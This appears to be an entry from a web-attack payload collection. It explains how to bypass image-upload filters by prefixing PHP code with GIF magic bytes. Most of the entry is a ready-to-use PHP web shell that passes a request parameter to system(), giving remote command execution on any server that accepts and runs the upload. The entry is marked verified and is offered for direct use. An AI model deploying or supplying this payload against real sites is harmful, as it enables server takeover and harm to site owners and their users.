---
id: ef8a85cb-ef13-4916-9f7f-b85093f98b4f
name: Image Filter Bypass 'GIF8' Magic Bytes
type: payload
verified: true
created_at: '2019-09-17T19:52:47.874087+00:00'
updated_at: '2023-05-30T20:03:49.770237+00:00'
---

# Image Filter Bypass 'GIF8' Magic Bytes

**Status**: ✓ Verified

 Web based image uploaders can filter certain image types, either associating them by their "Magic Bytes" or file extension. These filters can look for both, in our case we alter a snippet of PHP code with the GIF Magic Bytes prefixing the code, tricking these filter systems to believe...

## Description

# Description

Web based image uploaders can filter certain image types, either associating them by their "Magic Bytes" or file extension. These filters can look for both, in our case we alter a snippet of PHP code with the GIF Magic Bytes prefixing the code, tricking these filter systems to believe this is an actual image.

The PHP Interpreter can run this code, even though it looks like an image.

## Payload

**Code** ([[ GIF8
<?php echo system($_REQUEST["cmd"]); ?>]]):

```php
 GIF8
<?php echo system($_REQUEST["cmd"]); ?>
```
